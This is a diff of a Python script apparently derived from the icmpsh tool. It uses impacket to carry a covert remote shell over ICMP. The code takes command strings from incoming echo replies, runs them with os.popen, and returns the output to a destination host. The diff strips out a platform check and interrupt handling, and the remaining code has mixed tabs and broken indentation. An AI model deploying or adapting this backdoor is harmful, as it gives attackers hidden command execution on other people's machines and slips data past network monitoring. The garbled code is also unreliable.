@@ -39,9 +39,6 @@ def setNonBlocking(fd):
 
 def main(dst):
  while True:
-    if subprocess.mswindows:
-        sys.stderr.write('icmpsh master can only run on Posix systems\n')
-        sys.exit(255)
 
     try:
         from impacket import ImpactDecoder
@@ -68,7 +65,6 @@ def main(dst):
 
     # Create a new IP packet and set its source and destination addresses
     ip = ImpactPacket.IP()
-    #ip.set_ip_src(src)
     ip.set_ip_dst(dst)
 
     # Create a new ICMP packet of type ECHO 
@@ -117,10 +113,6 @@ def main(dst):
             if 0 == icmppacket.get_icmp_type() :
               try:
                 # Get identifier and sequence number
-                #dst =  ippacket.get_ip_src()
-                #src =  ippacket.get_ip_dst()
-                #ip.set_ip_src(src)
-                #ip.set_ip_dst(dst)
 
 		ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
@@ -133,8 +125,6 @@ def main(dst):
                 #Parse command from standard input
 		strcmd = os.popen(data).read()
                 
-		#proc = subprocess.Popen(data, stdout=subprocess.PIPE)
-		#strcmd = proc.stdout.read()                
                 # Set sequence number and identifier
                 icmp.set_icmp_id(ident)
                 icmp.set_icmp_seq(seq_id)
@@ -149,9 +139,6 @@ def main(dst):
 		ip.contains(icmp)
   		sock.sendto(ip.get_packet(), (dst, 0))
               except:
-	        if KeyboardInterrupt:  
-		 return
-                else:
                  break
 	#time.sleep(5)
 
